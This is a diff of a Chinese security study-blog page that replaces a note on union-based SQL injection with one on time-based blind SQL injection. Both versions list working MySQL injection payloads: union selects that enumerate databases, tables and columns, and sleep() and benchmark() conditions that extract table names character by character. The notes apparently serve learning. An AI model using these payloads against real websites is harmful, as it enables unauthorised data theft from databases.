@@ -10,9 +10,9 @@
 
     <!--Description-->
     
-        <meta name="description" content="前提123union select 页面有显示位置，使前面数据显示为空，将 union select 后面的数据显示在页面相应的位置，在显示的位置执行sql语句，进行注入
+        <meta name="description" content="条件：前三种手段页面都不变化，尝试时间延时盲注12345and sleep()   //判断能不能延时注入select sleep() //返回结果为0，为假select benchmark(10000000,sha(1)/md5(1))  //返回结果为0，为假，根据指定次数运行函数
 
-攻击步骤1、判断有无注入，是字符型还是数字型注入12数字型直接加攻击代码，以防万一，后面加注释符  #， -- x 等字符型，">
+123if">
     
 
     <!--Author-->
@@ -22,7 +22,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="攻击手法1---Union联合查询">
+        <meta property="og:title" content="攻击手法4--时间延时盲注">
     
 
     <!--Open Graph Description-->
@@ -44,7 +44,7 @@
 
     <!-- Title -->
     
-    <title>攻击手法1---Union联合查询 - XMD5 STUDY BLOG</title>
+    <title>攻击手法4--时间延时盲注 - XMD5 STUDY BLOG</title>
 
     <!-- Tachyons Core CSS -->
     <link rel="stylesheet" href="https://unpkg.com/tachyons/css/tachyons.min.css">
@@ -100,8 +100,8 @@
     <!-- Title -->
     <div class="w-100 mw8 center vh-40 dt">
         <div class="dtc v-mid white">
-            <h1 class="f1-l f2-m tc tc-m tl-ns">攻击手法1---Union联合查询</h1>
-            <p class="f4 fw3 pab-100px tc tc-m tl-ns">2019-08-17</p>
+            <h1 class="f1-l f2-m tc tc-m tl-ns">攻击手法4--时间延时盲注</h1>
+            <p class="f4 fw3 pab-100px tc tc-m tl-ns">2019-08-23</p>
         </div>
     </div>
 
@@ -127,21 +127,15 @@
                     
 
                     <!-- Main Post Content -->
-                    <h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select </span><br><span class="line">页面有显示位置，使前面数据显示为空，</span><br><span class="line">将 union select 后面的数据显示在页面相应的位置，在显示的位置执行sql语句，进行注入</span><br></pre></td></tr></table></figure>
+                    <h4 id="条件：前三种手段页面都不变化，尝试时间延时盲注"><a href="#条件：前三种手段页面都不变化，尝试时间延时盲注" class="headerlink" title="条件：前三种手段页面都不变化，尝试时间延时盲注"></a>条件：前三种手段页面都不变化，尝试时间延时盲注</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">and sleep()   //判断能不能延时注入</span><br><span class="line"></span><br><span class="line">select sleep() //返回结果为0，为假</span><br><span class="line"></span><br><span class="line">select benchmark(10000000,sha(1)/md5(1))  //返回结果为0，为假，根据指定次数运行函数</span><br></pre></td></tr></table></figure>
 
-<h2 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h2><h4 id="1、判断有无注入，是字符型还是数字型注入"><a href="#1、判断有无注入，是字符型还是数字型注入" class="headerlink" title="1、判断有无注入，是字符型还是数字型注入"></a>1、判断有无注入，是字符型还是数字型注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数字型直接加攻击代码，以防万一，后面加注释符  #， -- x 等</span><br><span class="line">字符型，先破坏原有结构，后面加注释符 ，在两者之间执行代码，  ‘ [攻击代码]#</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(条件，真，假）；//mysql里的if条件判断</span><br><span class="line"></span><br><span class="line">case 条件 when 1 then 真  else 0 end;  //mysql里的case判断，类似switch case判断</span><br></pre></td></tr></table></figure>
 
-<h4 id="2、使用-order-by-判断前面的字段数"><a href="#2、使用-order-by-判断前面的字段数" class="headerlink" title="2、使用  order by 判断前面的字段数"></a>2、使用  order by 判断前面的字段数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 后的数大于前面的字段数时，页面显示异常</span><br></pre></td></tr></table></figure>
+<h3 id="核心解析"><a href="#核心解析" class="headerlink" title="核心解析"></a>核心解析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">核心是将bool盲注的判断条件，放到 if()判断 或 case判断 中，成立则执行 时间延时函数 sleep() 或  </span><br><span class="line">benchmark() ，不成立返回给定的值，通过延时刷新页面去猜解相应数据</span><br></pre></td></tr></table></figure>
 
-<h4 id="3、然后-and-0-union-select-1-2-3，字段数-查看页面输出哪些字段，且输出位置在哪"><a href="#3、然后-and-0-union-select-1-2-3，字段数-查看页面输出哪些字段，且输出位置在哪" class="headerlink" title="3、然后 and 0 union select 1,2,3，字段数 查看页面输出哪些字段，且输出位置在哪"></a>3、然后 and 0 union select 1,2,3，字段数 查看页面输出哪些字段，且输出位置在哪</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">先让前面语句执行结果为空，在显示位上显示后面语句中数字，方便后面使用</span><br></pre></td></tr></table></figure>
+<h4 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参数后+ and/or(慎用)+执行语句</span><br><span class="line"></span><br><span class="line">and if(length(version())&gt;10,sleep(2),0);</span><br><span class="line"></span><br><span class="line">and case length(version())&gt;10 when 1 then sleep(3) else 0 end;  //两种判断</span><br></pre></td></tr></table></figure>
 
-<h4 id="4、在显示的位置上查询相关信息"><a href="#4、在显示的位置上查询相关信息" class="headerlink" title="4、在显示的位置上查询相关信息"></a>4、在显示的位置上查询相关信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION SELECT user(),version(),database() -- x</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查库名：(select group_concat(schema_name) from information_schema.schemata)</span><br><span class="line"></span><br><span class="line">查库中的表：(select group_concat(table_name) from information_schema.tables where table_schema = 0x6D796E657773) //红色为库名的16进制</span><br><span class="line"></span><br><span class="line">查库中里表的字段名：</span><br><span class="line">(select group_concat(column_name) from information_schema.columns where table_schema = 0x6D796E657773 and table_name=0x74625F7573657273)</span><br><span class="line"></span><br><span class="line">查字段中的数据：(select group_concat(column1,0x7e,column2) from 库名.表名)</span><br><span class="line"></span><br><span class="line">将上面的内容放在页面显示的位置中，且让union select 前的条件为假，在页面中显示我们需要的内容</span><br></pre></td></tr></table></figure>
-
-<h4 id="搜索框注入："><a href="#搜索框注入：" class="headerlink" title="搜索框注入："></a>搜索框注入：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">条件是:    select * from news where contents = ‘%KEYWORDS%’;</span><br><span class="line">破坏时，需要加%闭合前面的语句，加注释符注释后面的语句，剩余流程和上面一样</span><br></pre></td></tr></table></figure>
-
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">	and if((select count(table_name) from information_schema.tables where table_schema = database())&gt;4,sleep(3),0)-- x   </span><br><span class="line">//判断当前数据库表的个数</span><br><span class="line"></span><br><span class="line">and if(length((select table_name from information_schema.tables where table_schema = database() limit i,1))&gt;7,sleep(3),0)-- x   </span><br><span class="line">//判断第[i+1]个表名的长度</span><br><span class="line"></span><br><span class="line">and if(ascii(mid((select table_name from information_schema.tables where table_schema = database() limit i,1),j,1))&gt;100,sleep(3),0)-- x  </span><br><span class="line">//二分法判断第[i+1]个表的表名的第j个字母的ascii码，依次判断每个字母，猜解出这个表名</span><br></pre></td></tr></table></figure>
                     
                     <!-- Tags Bottom -->
                     
